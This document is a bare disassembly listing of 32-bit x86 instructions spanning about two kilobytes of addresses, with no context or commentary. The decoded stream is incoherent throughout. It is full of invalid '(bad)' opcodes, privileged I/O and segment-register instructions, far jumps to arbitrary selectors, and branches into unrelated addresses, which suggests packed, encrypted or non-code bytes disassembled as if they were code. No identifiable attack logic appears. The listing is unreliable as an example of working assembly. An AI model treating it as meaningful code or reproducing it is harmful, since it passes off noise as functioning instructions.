  4120e5:	mov    dh,BYTE PTR [esi]
  4120e7:	and    ebx,DWORD PTR [ecx+esi*8+0x62]
  4120eb:	push   edx
  4120ec:	xchg   ebp,eax
  4120ed:	fadd   QWORD PTR [ecx+0x7b3c0892]
  4120f3:	popf   
  4120f4:	adc    esi,edx
  4120f6:	xchg   DWORD PTR [esi+edi*1],edi
  4120f9:	icebp  
  4120fa:	add    bl,ah
  4120fc:	jmp    0x21bf:0xb65eb37d
  412103:	mov    ah,0x9e
  412105:	out    dx,al
  412106:	ss fcmovnbe st,st(3)
  412109:	xor    DWORD PTR [edx+edi*4-0x49],edx
  41210d:	pop    eax
  41210e:	(bad)  
  41210f:	es pop ecx
  412111:	xor    DWORD PTR [esi+ebp*1-0x2b],0xe6b8091d
  412119:	arpl   WORD PTR [edi+0x5e],dx
  41211c:	mov    esi,0x4b0f8650
  412121:	pop    ebp
  412122:	add    DWORD PTR ds:0x28303a2b,0x3cedb295
  41212c:	pop    es
  41212d:	repnz cmp ecx,DWORD PTR [esi-0x76887b8f]
  412134:	je     0x412106
  412136:	inc    ecx
  412137:	push   ds
  412138:	out    0xfe,eax
  41213a:	int3   
  41213b:	popf   
  41213c:	and    BYTE PTR [esi-0x57c26daf],cl
  412142:	or     al,cl
  412144:	or     ah,ch
  412146:	ret    
  412147:	enter  0xf184,0x47
  41214b:	add    eax,0x443efebb
  412150:	jge    0x412167
  412152:	cmp    edi,eax
  412154:	test   eax,0x9a84465
  412159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41215a:	xor    esi,DWORD PTR [edx+0x70b8094c]
  412160:	test   ebx,esi
  412162:	ins    BYTE PTR es:[edi],dx
  412163:	ror    DWORD PTR ds:0xb013e343,1
  412169:	jae    0x4121c1
  41216b:	mov    eax,0x5e9158d4
  412170:	shr    DWORD PTR [edi-0x1c1544c3],1
  412176:	xchg   DWORD PTR [edi],esi
  412178:	sub    DWORD PTR [ebp+0x3e35f461],edx
  41217e:	jns    0x4121a9
  412180:	adc    dh,BYTE PTR [esi-0x6d]
  412183:	leave  
  412184:	mul    DWORD PTR ds:0xf616552f
  41218a:	pop    ebp
  41218b:	mov    dl,0xa9
  41218d:	lock mov ah,0x7e
  412190:	js     0x4121f1
  412192:	sub    al,al
  412194:	cmp    al,al
  412196:	mov    bl,0x26
  412198:	jo     0x41218a
  41219a:	cmc    
  41219b:	in     eax,dx
  41219c:	icebp  
  41219d:	call   0xf0795fc8
  4121a2:	fs pop esi
  4121a4:	pop    esi
  4121a5:	inc    eax
  4121a6:	fwait
  4121a7:	mov    cl,0x88
  4121a9:	sahf   
  4121aa:	pop    eax
  4121ab:	inc    ebp
  4121ac:	lods   eax,DWORD PTR ds:[esi]
  4121ad:	repnz test BYTE PTR [edi+0x25f94d85],0xe9
  4121b5:	push   es
  4121b6:	ins    BYTE PTR es:[edi],dx
  4121b7:	in     al,dx
  4121b8:	sbb    esi,DWORD PTR [ebx-0x4351f11d]
  4121be:	inc    edx
  4121bf:	dec    ecx
  4121c0:	or     DWORD PTR [edi+0x4d107786],edx
  4121c6:	pushf  
  4121c7:	stos   BYTE PTR es:[edi],al
  4121c8:	lods   eax,DWORD PTR ds:[esi]
  4121c9:	fadd   st(1),st
  4121cb:	sub    BYTE PTR [ecx-0x7c],cl
  4121ce:	ds push ds
  4121d0:	or     BYTE PTR [esi-0x320f9b6d],cl
  4121d6:	mov    al,ds:0x34f76f02
  4121db:	jns    0x41223c
  4121dd:	mov    DWORD PTR [ebx-0x6ca665fa],0xbd1f31d5
  4121e7:	clc    
  4121e8:	and    esi,DWORD PTR [edi+eax*4]
  4121eb:	mov    bh,0xfb
  4121ed:	mov    fs,esi
  4121ef:	cmp    BYTE PTR [ecx+0x752e29e4],al
  4121f5:	pop    eax
  4121f6:	pop    ebx
  4121f7:	ret    0x998
  4121fa:	mov    bh,0xb0
  4121fc:	mov    al,ds:0x3f38756
  412201:	jae    0x4121e7
  412203:	retf   
  412204:	dec    ecx
  412205:	add    al,0x84
  412207:	sub    ebx,esi
  412209:	sar    ah,1
  41220b:	je     0x41221c
  41220d:	inc    esp
  41220e:	int3   
  41220f:	mov    al,0xed
  412211:	cmc    
  412212:	jle    0x412290
  412214:	xor    esp,edi
  412216:	imul   edi,ebx,0x2e2c818f
  41221c:	ret    
  41221d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41221e:	call   0xd2cf3994
  412223:	and    al,0x8
  412225:	xor    bl,BYTE PTR [ebx+0x43826a3c]
  41222b:	sti    
  41222c:	test   al,dh
  41222e:	cli    
  41222f:	pusha  
  412230:	rcl    BYTE PTR gs:[edx-0x2],cl
  412234:	mov    ah,0x9e
  412236:	(bad)  
  412237:	xor    cl,BYTE PTR [eax]
  412239:	or     BYTE PTR [edi+0x1e],ch
  41223c:	mov    bl,0x48
  41223e:	inc    eax
  41223f:	icebp  
  412240:	in     al,dx
  412241:	lock test cl,ah
  412244:	ror    eax,cl
  412246:	enter  0xb584,0x2e
  41224a:	push   ss
  41224b:	cli    
  41224c:	adc    eax,0xfd38626
  412251:	dec    edx
  412252:	imul   esp,esi,0xffffffb9
  412255:	enter  0x295b,0xbf
  412259:	push   ds
  41225a:	sub    eax,0x99be06f8
  41225f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412260:	shr    BYTE PTR [ebp+0x7ad61464],1
  412266:	push   es
  412267:	fsub   DWORD PTR [ecx]
  412269:	adc    eax,0x2bad29f4
  41226e:	and    ch,BYTE PTR [ecx+0xf]
  412271:	repnz repnz popf 
  412274:	repnz mov eax,0xebc8075f
  41227a:	xlat   BYTE PTR ds:[ebx]
  41227b:	or     ch,ch
  41227d:	push   0xe9535b6a
  412282:	mov    cs,eax
  412284:	popa   
  412285:	jb     0x41225c
  412287:	lods   al,BYTE PTR ds:[esi]
  412288:	shr    DWORD PTR [ebx],0x6
  41228b:	cmp    DWORD PTR [edx-0x7f],ebx
  41228e:	inc    eax
  41228f:	enter  0xa1b7,0x8c
  412293:	outs   dx,DWORD PTR ds:[esi]
  412294:	ja     0x4122d9
  412296:	jecxz  0x4122bd
  412298:	cld    
  412299:	lock enter 0xa0df,0x12
  41229e:	add    BYTE PTR [esi+ebp*8+0x31],bl
  4122a2:	out    dx,ax
  4122a4:	jle    0x4122fb
  4122a6:	xchg   ebx,esp
  4122a8:	(bad)  
  4122a9:	or     edi,DWORD PTR [ecx-0x5f]
  4122ac:	scas   eax,DWORD PTR es:[edi]
  4122ad:	aad    0x9b
  4122af:	sub    BYTE PTR [edx+0x13492996],bl
  4122b5:	jb     0x412247
  4122b7:	and    ch,ch
  4122b9:	icebp  
  4122ba:	imul   esi,DWORD PTR [ecx],0x4a473685
  4122c0:	pop    es
  4122c1:	ds or  al,0x28
  4122c4:	js     0x412326
  4122c6:	xchg   ebx,eax
  4122c7:	pop    esi
  4122c8:	js     0x4122c0
  4122ca:	push   0xfcfbedfa
  4122cf:	sub    DWORD PTR [eiz*4-0x21dea000],edx
  4122d6:	mov    DWORD PTR [ecx],ebp
  4122d8:	xor    BYTE PTR [edx-0x5e],dh
  4122db:	mov    ch,0x8
  4122dd:	cli    
  4122de:	(bad)  
  4122df:	sbb    ecx,eax
  4122e1:	pop    ebp
  4122e2:	push   ds
  4122e3:	cmp    dh,BYTE PTR [edi-0xf]
  4122e6:	adc    BYTE PTR [ecx+eiz*2],ch
  4122e9:	or     al,0xc9
  4122eb:	cmp    eax,0x7ecb962e
  4122f0:	retf   0x861b
  4122f3:	out    dx,eax
  4122f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f5:	dec    BYTE PTR [eax]
  4122f7:	outs   dx,BYTE PTR ds:[esi]
  4122f8:	jnp    0x4122e1
  4122fa:	aaa    
  4122fb:	sub    BYTE PTR [ebp+0x27],dl
  4122fe:	or     esp,DWORD PTR [ecx+0xe]
  412301:	cmp    bl,BYTE PTR [ebx]
  412303:	jo     0x4122dd
  412305:	ret    0x5082
  412308:	fnsave [esi-0x2b5c772d]
  41230e:	push   0xb7d63d29
  412313:	sbb    al,0xf9
  412315:	adc    dl,BYTE PTR [ecx]
  412317:	jno    0x412352
  412319:	loop   0x4122a1
  41231b:	aas    
  41231c:	xchg   ebp,eax
  41231d:	mov    ebx,0xc0c50b59
  412322:	mov    edx,0x1ef63d29
  412327:	jp     0x4122e1
  412329:	adc    BYTE PTR [ecx],al
  41232b:	push   es
  41232c:	arpl   WORD PTR [eax-0x53],si
  41232f:	sub    dh,BYTE PTR [ebx+0x7a]
  412332:	sbb    al,0x40
  412334:	push   ebp
  412335:	lock push ss
  412337:	cld    
  412338:	repnz and ebx,ecx
  41233b:	push   0xffffffc3
  41233d:	nop
  41233e:	loope  0x4122f4
  412340:	or     BYTE PTR [esi+ecx*2],dl
  412343:	or     bl,BYTE PTR ss:[esi-0x57]
  412347:	in     al,0xde
  412349:	jecxz  0x4123a5
  41234b:	push   cs
  41234c:	or     bh,ah
  41234e:	and    bh,BYTE PTR [eax]
  412350:	repz push eax
  412352:	xchg   BYTE PTR [edx-0x9],bh
  412355:	icebp  
  412356:	jge    0x412385
  412358:	loope  0x412329
  41235a:	not    DWORD PTR [edx]
  41235c:	mov    ebp,0x636eaaf1
  412361:	pop    ebp
  412362:	add    DWORD PTR ds:0x95a0b362,edi
  412368:	scas   al,BYTE PTR es:[edi]
  412369:	daa    
  41236a:	xchg   ebx,ecx
  41236c:	push   edx
  41236e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41236f:	pop    ss
  412370:	mov    esp,0x1d908936
  412375:	inc    edx
  412376:	push   0xb129db29
  41237b:	dec    eax
  41237c:	xor    BYTE PTR ss:[edi+0x347d08a2],al
  412383:	call   0x1b59dc3b
  412388:	pop    ebp
  412389:	out    0x41,al
  41238b:	sub    bh,al
  41238d:	pop    esi
  41238e:	mov    ebx,0x2242e0dc
  412393:	jbe    0x412359
  412395:	push   0x30fdb382
  41239a:	cdq    
  41239b:	mov    al,0xa9
  41239d:	lock cli 
  41239f:	in     al,dx
  4123a0:	mov    dl,0xd3
  4123a2:	jg     0x4123aa
  4123a4:	ret    
  4123a5:	lea    esi,[eax+ecx*8+0x40]
  4123a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123aa:	add    DWORD PTR [ebp-0x7d908e22],0xffffff9c
  4123b1:	mov    eax,0xf67f2666
  4123b6:	fimul  DWORD PTR [edi]
  4123b8:	pushf  
  4123b9:	xor    esp,eax
  4123bb:	ins    BYTE PTR es:[edi],dx
  4123bc:	daa    
  4123bd:	sbb    eax,0xc85c1f7
  4123c2:	xchg   ebp,esp
  4123c4:	out    0x3f,al
  4123c6:	fimul  DWORD PTR [edx+0x11a8c1cb]
  4123cc:	mov    al,0x88
  4123ce:	jmp    0x983:0xd5d7c9af
  4123d5:	or     al,0xc6
  4123d7:	stos   DWORD PTR es:[edi],eax
  4123d8:	shl    ebx,0x41
  4123db:	fs push ebp
  4123dd:	repz push esi
  4123df:	add    BYTE PTR [esi],ch
  4123e1:	ficomp DWORD PTR [ebp-0x73]
  4123e4:	push   ecx
  4123e5:	mov    al,0x56
  4123e7:	jg     0x4123f2
  4123e9:	mov    ds:0x52b69446,al
  4123ee:	cli    
  4123ef:	stos   DWORD PTR es:[edi],eax
  4123f0:	jmp    0x40064f4
  4123f5:	dec    ecx
  4123f6:	(bad)  
  4123f7:	and    DWORD PTR [edi-0x78],ebx
  4123fa:	adc    ebp,ecx
  4123fc:	or     BYTE PTR [esi],bh
  4123fe:	inc    edi
  4123ff:	xchg   BYTE PTR [ebx],dh
  412401:	div    DWORD PTR [esi-0x76]
  412404:	in     al,dx
  412405:	icebp  
  412406:	mov    esp,0xaffc7dc5
  41240b:	hlt    
  41240c:	and    al,ah
  41240e:	and    bl,BYTE PTR [edi+eiz*8+0x2]
  412412:	xchg   cl,dh
  412414:	daa    
  412415:	dec    ebp
  412416:	jl     0x412453
  412418:	addr16 lock or al,0xdc
  41241c:	add    DWORD PTR [ebp-0x20699a09],esi
  412422:	inc    edx
  412423:	(bad)  
  412424:	mov    edi,cs
  412426:	xchg   BYTE PTR [ebp+0x7],bl
  412429:	gs sbb eax,0xe3aa4d69
  41242f:	sub    BYTE PTR [edx+0x2851825d],ch
  412435:	xor    eax,0xd963e3fb
  41243a:	xchg   DWORD PTR [edi],ecx
  41243c:	ffreep st(2)
  41243e:	enter  0xad72,0x80
  412442:	mov    edi,0x27a23428
  412447:	sbb    BYTE PTR [ecx],cl
  412449:	adc    DWORD PTR ss:[esi-0x730ebf1c],edx
  412450:	push   es
  412451:	icebp  
  412452:	sub    BYTE PTR [ebx+0x32d92337],al
  412458:	jno    0x4124bc
  41245a:	jne    0x4124ac
  41245c:	cmp    BYTE PTR [eax-0x7a],dl
  41245f:	sub    eax,0xa0ad2953
  412464:	int    0x3a
  412466:	lock mov ebx,DWORD PTR es:[ebp+0x608c511]
  41246e:	nop
  41246f:	jno    0x41249f
  412471:	adc    eax,0x35a399d2
  412476:	jge    0x4124eb
  412478:	or     ecx,edi
  41247a:	mov    ch,0x63
  41247c:	or     ah,ah
  41247e:	sub    ch,bl
  412480:	cwde   
  412481:	dec    esi
  412482:	mov    cl,0xe4
  412484:	push   edi
  412485:	dec    eax
  412486:	push   esi
  412487:	sub    DWORD PTR [edi+0x34627578],ecx
  41248d:	inc    esp
  41248e:	add    eax,0x8a8102d3
  412493:	jecxz  0x412420
  412495:	fst    QWORD PTR [eax]
  412497:	test   al,0xa9
  412499:	sub    eax,0xf649e551
  41249e:	adc    bh,BYTE PTR [esi]
  4124a0:	or     BYTE PTR ds:0xe91fe06b,bh
  4124a6:	ror    BYTE PTR [edi+0x3736f06f],cl
  4124ac:	push   edx
  4124ad:	dec    ecx
  4124ae:	ror    DWORD PTR [ecx-0x29],1
  4124b1:	icebp  
  4124b2:	ins    BYTE PTR es:[edi],dx
  4124b3:	out    0x2f,al
  4124b5:	mov    esp,0x3dfc50f8
  4124ba:	adc    al,0xeb
  4124bc:	fnstenv [esi-0x78]
  4124bf:	xchg   DWORD PTR [eax+esi*2+0x6],esi
  4124c3:	ret    0x41f8
  4124c6:	les    ecx,FWORD PTR [eax]
  4124c8:	dec    ebx
  4124c9:	and    al,0xab
  4124cb:	sub    DWORD PTR [ebp+0x47],esp
  4124ce:	daa    
  4124cf:	or     BYTE PTR ds:0x3e67c104,al
  4124d5:	dec    BYTE PTR [ebp-0x1813272d]
  4124db:	push   edx
  4124dc:	loope  0x4124f1
  4124de:	das    
  4124df:	sub    ecx,ecx
  4124e1:	push   ebp
  4124e2:	and    eax,0x3375f71b
  4124e7:	jl     0x41253a
  4124e9:	jl     0x4124c8
  4124eb:	stos   BYTE PTR es:[edi],al
  4124ec:	stos   BYTE PTR es:[edi],al
  4124ed:	icebp  
  4124ee:	mov    gs,WORD PTR [eax+eiz*1-0x43]
  4124f2:	jmp    0xbbb3:0x834e7cb4
  4124f9:	xor    BYTE PTR [esi-0x10680137],al
  4124ff:	sbb    al,0xad
  412501:	in     al,dx
  412502:	out    0x29,al
  412504:	adc    bh,bh
  412506:	jecxz  0x412528
  412508:	mul    DWORD PTR [edi+0x1bf8710d]
  41250e:	outs   dx,BYTE PTR ds:[esi]
  41250f:	sub    ah,cl
  412511:	cmp    ebx,ebp
  412513:	push   edx
  412514:	mov    eax,ds:0x7f29cfc2
  412519:	push   edx
  41251a:	jle    0x412546
  41251c:	imul   DWORD PTR [ecx-0x7f]
  41251f:	data16 je 0x412563
  412522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412523:	rcpps  xmm6,xmm0
  412526:	inc    esi
  412527:	cmp    ch,bl
  412529:	pop    edx
  41252a:	cli    
  41252b:	ror    DWORD PTR [ebx+0x39],0xd8
  41252f:	xor    al,0xf1
  412531:	adc    BYTE PTR [edi-0x53865727],al
  412537:	inc    edi
  412538:	sub    BYTE PTR [eax-0x3e3c4f25],ah
  41253e:	xchg   BYTE PTR [ebp-0x47df419e],ch
  412544:	sbb    eax,0x72c586db
  412549:	sbb    eax,0x6b9dbf8a
  41254e:	mov    gs,WORD PTR [ecx]
  412550:	mov    eax,0x339be0f3
  412555:	push   eax
  412556:	call   0x528b2dcd
  41255b:	mov    eax,ds:0xb6fd0f33
  412560:	mov    DWORD PTR [esi+esi*2+0x51],edx
  412564:	sub    eax,0x3038726
  412569:	in     al,0x12
  41256b:	cld    
  41256c:	imul   DWORD PTR [edi+0x7d]
  41256f:	dec    ebp
  412570:	mov    bh,0x7d
  412572:	xchg   DWORD PTR [edi+edi*4+0x1d],edx
  412576:	pop    esi
  412577:	jle    0x41255e
  412579:	jbe    0x412511
  41257b:	and    BYTE PTR ss:[eax],ah
  41257e:	scas   eax,DWORD PTR es:[edi]
  41257f:	dec    esi
  412580:	adc    eax,0xd8f586da
  412585:	xchg   DWORD PTR [ecx-0x79f01d86],edx
  41258b:	int    0x7b
  41258d:	popa   
  41258e:	cld    
  41258f:	dec    edx
  412590:	dec    edi
  412591:	test   ebp,0xa501b79
  412597:	sub    BYTE PTR [edi],al
  412599:	fcomp  DWORD PTR ds:0x47a00968
  41259f:	mov    ds:0x50b0024a,eax
  4125a4:	pusha  
  4125a5:	icebp  
  4125a6:	enter  0x5731,0x13
  4125aa:	cs repz mov ebx,0xcfbdb4dd
  4125b1:	imul   eax,DWORD PTR [edx-0x62ce4ed9],0x31
  4125b8:	mov    bl,0xf3
  4125ba:	sbb    bh,BYTE PTR [ecx-0x23]
  4125bd:	cvtps2pd xmm2,xmm2
  4125c0:	loopne 0x41262a
  4125c2:	mov    edi,0xac46f1e3
  4125c7:	aaa    
  4125c8:	pop    es
  4125c9:	imul   eax,DWORD PTR [esi-0x32fc30fb],0x56e21bd0
  4125d3:	sub    BYTE PTR [eax+0x8f621ea],bh
  4125d9:	fcomp  st(4)
  4125db:	xor    BYTE PTR [ebx],0xfc
  4125de:	cli    
  4125df:	push   0xffffff99
  4125e1:	add    al,0xf8
  4125e3:	addr16 aad 0x9b
  4125e6:	or     ebp,DWORD PTR [edi]
  4125e8:	(bad)  
  4125e9:	loopne 0x41262f
  4125eb:	out    0xdc,al
  4125ed:	cmp    eax,0xf479a036
  4125f2:	lods   al,BYTE PTR ds:[esi]
  4125f3:	cwde   
  4125f4:	push   ebx
  4125f5:	pushf  
  4125f6:	ins    DWORD PTR es:[edi],dx
  4125f7:	mov    ebx,0xb70930c8
  4125fc:	or     BYTE PTR [edx-0x50],dh
  4125ff:	adc    BYTE PTR [ebx+0x66a450bc],ch
  412605:	lock and dh,BYTE PTR [edx+0x6ec2929e]
  41260c:	std    
  41260d:	dec    ebp
  41260e:	mov    eax,0x874ce774
  412613:	fwait
  412614:	inc    esi
  412615:	mov    ebx,0xc2b7db83
  41261a:	lods   al,BYTE PTR ds:[esi]
  41261b:	sub    BYTE PTR [edx-0x848503b],al
  412621:	add    esp,DWORD PTR [esi+0x5c]
  412624:	jns    0x4125c4
  412626:	or     edi,ebx
  412628:	(bad)  
  412629:	icebp  
  41262a:	sub    cl,dh
  41262c:	lods   eax,DWORD PTR ds:[esi]
  41262d:	jns    0x412601
  41262f:	cmp    eax,0x1bb83eb8
  412634:	dec    ebx
  412635:	sub    eax,0x8c64e058
  41263a:	xchg   DWORD PTR [ecx+0x227ec11d],edx
  412640:	adc    edx,DWORD PTR [esi+0x2a]
  412643:	sub    ch,ch
  412645:	inc    ecx
  412646:	dec    ebp
  412647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412648:	ss pop esi
  41264a:	xchg   esp,eax
  41264b:	addr16 mov esp,esi
  41264e:	push   esp
  41264f:	sbb    DWORD PTR [edx+0x49a91eb4],0xffffffd7
  412656:	jo     0x4126a8
  412658:	ret    
  412659:	(bad)  
  41265a:	jo     0x412684
  41265c:	mov    ds,WORD PTR [esi-0x19f7ee55]
  412662:	mov    ch,BYTE PTR [esi]
  412664:	cmc    
  412665:	and    BYTE PTR [ebx-0x64],ah
  412668:	jo     0x41265a
  41266a:	and    al,cl
  41266c:	push   ss
  41266d:	xchg   edi,eax
  41266e:	dec    esp
  41266f:	lods   eax,DWORD PTR ds:[esi]
  412670:	mov    fs,WORD PTR [ebx]
  412672:	adc    BYTE PTR [edx],dh
  412674:	pop    ecx
  412675:	lock push ds
  412677:	xchg   ecx,eax
  412678:	int3   
  412679:	dec    esi
  41267a:	cmp    al,0xa4
  41267c:	mov    ch,BYTE PTR [ebp-0x1e5b17a]
  412682:	inc    eax
  412683:	ror    BYTE PTR [edx+0x2d],0x7b
  412687:	mov    edx,0x3e87c448
  41268c:	div    DWORD PTR [ebx+0xc3590d]
  412692:	xor    ebx,DWORD PTR [edx+0x5c7ef04c]
  412698:	lds    edi,FWORD PTR [ebp-0x1fee7f80]
  41269e:	stc    
  41269f:	popa   
  4126a0:	mov    BYTE PTR [edi-0x79],ah
  4126a3:	xchg   edi,eax
  4126a4:	pop    edx
  4126a5:	ins    BYTE PTR es:[edi],dx
  4126a6:	hlt    
  4126a7:	outs   dx,DWORD PTR ds:[esi]
  4126a8:	ja     0x412688
  4126aa:	mov    bl,0x28
  4126ac:	mov    eax,0xd739499
  4126b1:	or     BYTE PTR [edx-0x25353804],dl
  4126b7:	mov    edi,DWORD PTR [eax]
  4126b9:	es pop esp
  4126bb:	test   eax,0x1712a501
  4126c0:	cmp    edx,esp
  4126c2:	(bad)  
  4126c3:	and    DWORD PTR [esi-0x13965929],esi
  4126c9:	cmp    al,0x40
  4126cb:	xchg   ebx,eax
  4126cc:	push   cs
  4126cd:	or     esi,esp
  4126cf:	sub    ch,ah
  4126d1:	or     al,0x8b
  4126d3:	sub    BYTE PTR [edi+eax*4+0x13],ch
  4126d7:	xor    bh,0x29
  4126da:	sti    
  4126db:	dec    esi
  4126dc:	sbb    esi,DWORD PTR [ebp-0xf681a34]
  4126e2:	sub    al,0xe2
  4126e4:	ficom  WORD PTR [edi+0x637fc93f]
  4126ea:	jne    0x4126c9
  4126ec:	outs   dx,DWORD PTR ds:[esi]
  4126ed:	fild   WORD PTR [edi-0x12ac52a7]
  4126f3:	or     al,0xc3
  4126f5:	(bad)  
  4126f6:	xor    DWORD PTR [ecx],ebp
  4126f8:	jb     0x412748
  4126fa:	sbb    DWORD PTR [ecx+0x8],0x9ded902e
  412701:	in     al,0xfa
  412703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412704:	add    DWORD PTR ds:0x95a9846a,eax
  41270a:	shr    BYTE PTR [ecx],0xb4
  41270d:	(bad)  [eax+0x7cc2086f]
  412713:	hlt    
  412714:	(bad)
  412717:	add    DWORD PTR ds:0x6a5f8f1,ebp
  41271d:	or     eax,0x67de9c37
  412722:	xchg   esi,eax
  412723:	xchg   BYTE PTR [ecx+0x64],dh
  412726:	xchg   BYTE PTR [ecx],dl
  412728:	std    
  412729:	sbb    DWORD PTR [esi],edx
  41272b:	neg    BYTE PTR [edi]
  41272d:	sub    al,ch
  41272f:	das    
  412730:	add    ch,BYTE PTR [ecx-0xec99676]
  412736:	mov    cl,0x16
  412738:	std    
  412739:	sbb    eax,DWORD PTR [ebx-0x666b6de5]
  41273f:	rol    DWORD PTR [edx+0x40],cl
  412742:	shr    ecx,1
  412744:	dec    edi
  412745:	cmc    
  412746:	pop    eax
  412747:	js     0x4127bb
  412749:	lahf   
  41274a:	and    ah,BYTE PTR [edx-0x78]
  41274d:	sub    al,0x5f
  41274f:	add    ebp,ebp
  412751:	sub    eax,DWORD PTR [ebx-0x79689d6a]
  412757:	std    
  412758:	xchg   DWORD PTR [eax-0x37],ebx
  41275b:	jne    0x412700
  41275d:	icebp  
  41275e:	(bad)  
  41275f:	cmc    
  412760:	jle    0x41272b
  412762:	bound  ecx,QWORD PTR [ecx+0x1c04b13]
  412768:	xor    bl,BYTE PTR [edi+0x7f3b0b87]
  41276e:	fisub  WORD PTR ds:[ebx+0x79]
  412772:	je     0x41279c
  412774:	add    esi,edx
  412776:	mov    ds,WORD PTR [eax+ecx*1]
  412779:	test   BYTE PTR [ecx-0x10b3b6ab],bh
  41277f:	cmp    al,0x71
  412781:	lock mov edx,0x978f0662
  412787:	mov    WORD PTR [edi],ss
  412789:	cmp    DWORD PTR [ecx+0x53f8098e],esp
  41278f:	mov    al,0x58
  412791:	sbb    DWORD PTR [ecx-0x5c],esi
  412794:	ret    0x92f0
  412797:	cwde   
  412798:	mov    edx,0x99b6c472
  41279d:	data16 (bad) 
  41279f:	cli    
  4127a0:	or     eax,DWORD PTR [esi]
  4127a2:	cmp    DWORD PTR [ebp-0x6d460e4c],0xca50fea1
  4127ac:	repnz cwde 
  4127ae:	mov    BYTE PTR [edx-0x39],cl
  4127b1:	sbb    dl,dh
  4127b3:	or     DWORD PTR [eax],ecx
  4127b5:	hlt    
  4127b6:	call   0xe9cb:0x163e32cc
  4127bd:	lock inc esp
  4127bf:	lods   eax,DWORD PTR ds:[esi]
  4127c0:	bound  edi,QWORD PTR [edi]
  4127c2:	inc    ebx
  4127c3:	pushf  
  4127c4:	mov    BYTE PTR [esi-0x45fccdf2],bh
  4127ca:	xchg   DWORD PTR [ebp-0x749d4879],esp
  4127d0:	(bad)  
  4127d1:	(bad)
  4127d5:	sar    ah,0xba
  4127d8:	sbb    al,BYTE PTR [esp+esi*1]
  4127db:	addr16 ds icebp 
  4127de:	mov    al,ds:0x2efa889f
  4127e3:	jmp    0x41285e
  4127e5:	xor    BYTE PTR [esi+0x29],0x3a
  4127e9:	add    DWORD PTR [ebp+0x6c],eax
  4127ec:	or     BYTE PTR [edx+0x4a],ah
  4127ef:	jbe    0x4127a0
  4127f1:	sbb    eax,0xf123c9eb
  4127f6:	push   esp
  4127f7:	hlt    
  4127f8:	mov    cl,0xa3
  4127fa:	sub    eax,DWORD PTR [ebx+0x2d]
  4127fd:	xchg   esp,eax
  4127fe:	pop    esi
  4127ff:	gs in  eax,dx
  412801:	lds    eax,FWORD PTR [ecx+ebx*2-0x3ea23595]
  412808:	iret   
  412809:	xchg   ebx,eax
  41280a:	add    eax,0x4358c50c
  41280f:	adc    ebp,esp
  412811:	inc    esi
  412812:	push   cs
  412813:	test   eax,0x3afc1919
  412818:	das    
  412819:	ins    DWORD PTR es:[edi],dx
  41281a:	xchg   BYTE PTR [ebx+0x7b],al
  41281d:	mov    ds:0xd0d78a54,al
  412822:	mov    bl,0x29
  412824:	xchg   eax,edi
  412826:	mov    dl,0x18
  412828:	neg    DWORD PTR [ebx+0x226e476a]
  41282e:	out    0xaf,eax
  412830:	(bad)  
  412831:	hlt    
  412832:	test   BYTE PTR [ebx-0x739f96a4],0xb7
  412839:	gs test al,0xe
  41283c:	push   ss
  41283d:	mov    edx,0xf0d18596
  412842:	sub    DWORD PTR [eax-0x7b],edi
  412845:	ja     0x412877
  412847:	cwde   
  412848:	xor    DWORD PTR [ecx-0x5222ee25],esi
  41284e:	jne    0x4127f8
  412850:	pop    edi
  412851:	mov    ds:0x8495c8ba,al
  412856:	xchg   DWORD PTR [edi-0x7c],esi
  412859:	(bad)  
  41285a:	inc    edx
  41285b:	jmp    0x2f9186a7
  412860:	in     al,dx
  412861:	add    edi,ebp
  412863:	push   edx
  412864:	inc    esp
  412865:	shl    bh,cl
  412867:	js     0x412830
  412869:	jge    0x4127f2
  41286b:	sar    DWORD PTR [edx+0xd367450],cl
  412871:	mov    DWORD PTR [ecx+0x5984a129],ebp
  412877:	leave  
  412878:	or     BYTE PTR [esi],bh
  41287a:	inc    eax
  41287b:	pusha  
  41287c:	add    al,0x38
  41287e:	clc    
  41287f:	sbb    al,0xe1
  412881:	mov    WORD PTR [eax+esi*4],ds
  412884:	not    DWORD PTR [ecx]
  412886:	fcomp  QWORD PTR [ebx]
  412888:	sbb    esi,esp
  41288a:	mov    BYTE PTR [eax],dh
  41288c:	idiv   DWORD PTR [ebp-0x3c]
  41288f:	outs   dx,DWORD PTR ds:[esi]
  412890:	les    esi,FWORD PTR [ebp+ebp*8+0x6e19fb71]
  412897:	mov    edx,DWORD PTR [ebx]
  412899:	push   ds
  41289a:	imul   ebp,DWORD PTR [esi],0x68
  41289d:	sbb    al,dh
  41289f:	mov    edi,0x54370c12
  4128a4:	jp     0x412896
  4128a6:	repz jge 0x4128c5
  4128a9:	mov    al,ds:0xf16699f2
  4128ae:	je     0x412900
  4128b0:	aaa    
  4128b1:	xor    DWORD PTR [esp+eax*4],eax
  4128b4:	cwde   
  4128b5:	or     eax,0xc5aa8102
  4128ba:	xchg   DWORD PTR [ebp+0x7d],edx
  4128bd:	push   es
  4128be:	xchg   BYTE PTR [eiz*4-0x66d669bd],al
  4128c5:	leave  
  4128c6:	add    BYTE PTR [edx-0xf],bh
  4128c9:	xchg   edx,eax
  4128ca:	int    0x85
  4128cc:	add    BYTE PTR ds:[edi+0x4df947cf],0xe4
  4128d4:	pop    es
  4128d5:	xchg   edi,eax
  4128d6:	cmp    ebp,DWORD PTR [eax]
  4128d8:	or     ch,dh
  4128da:	leave  
  4128db:	daa    
  4128dc:	or     ah,dh
  4128de:	mov    ebx,0x3fb67d94
  4128e3:	pop    edx
  4128e4:	nop
  4128e5:	jmp    0x412913
  4128e7:	add    esp,ebx
  4128e9:	das    
  4128ea:	les    ebp,FWORD PTR [eax]
  4128ec:	sub    ecx,DWORD PTR [ebp+0x4a]
  4128ef:	shl    BYTE PTR [ebx],cl
  4128f1:	pushf  
  4128f2:	fld    TBYTE PTR [ebx-0x32884378]
  4128f8:	fnstcw WORD PTR [ebx]
  4128fa:	fidiv  WORD PTR [ebx+esi*2]
  4128fd:	sti    
  4128fe:	pop    esi
  4128ff:	shl    dh,1
  412901:	fadd   QWORD PTR [edi+eax*4-0x50]
  412905:	dec    ebx
